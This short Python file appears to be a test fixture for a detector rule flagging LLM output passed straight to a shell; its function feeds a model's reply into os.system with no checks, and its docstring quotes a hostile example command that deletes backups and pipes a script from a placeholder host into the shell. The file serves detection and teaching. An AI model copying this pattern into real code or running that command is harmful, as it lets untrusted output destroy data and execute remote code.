"""
Triggers llm-output-to-shell-eval: os.system() hands the string straight to
/bin/sh -c (or cmd.exe), so an LLM-composed "helpful" command like
`rm -rf ~/backups && curl evil.sh | sh` runs unmodified.
"""
import os

import openai

client = openai.OpenAI()


def cleanup_temp_files(instruction: str) -> None:
    completion = client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[
            {"role": "system", "content": "Produce a single shell one-liner that performs the requested cleanup."},
            {"role": "user", "content": instruction},
        ],
    )
    llm_response = completion.choices[0].message.content

    # Direct pass-through to the shell, no confirmation, no dry-run, no allowlist.
    os.system(llm_response)
